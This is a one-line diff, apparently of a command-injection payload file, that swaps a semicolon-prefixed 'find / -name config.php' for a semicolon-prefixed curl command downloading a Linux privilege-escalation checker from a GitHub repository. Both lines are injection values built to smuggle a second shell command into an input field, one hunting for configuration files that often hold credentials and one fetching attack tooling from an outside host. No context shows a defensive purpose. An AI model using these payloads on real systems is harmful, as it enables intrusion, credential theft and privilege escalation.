@@ -1,1 +1,1 @@
-; find / -name config.php
+; curl -O https://raw.githubusercontent.com/albertlilem/test/master/linuxprivchecker3 && echo sucess ;
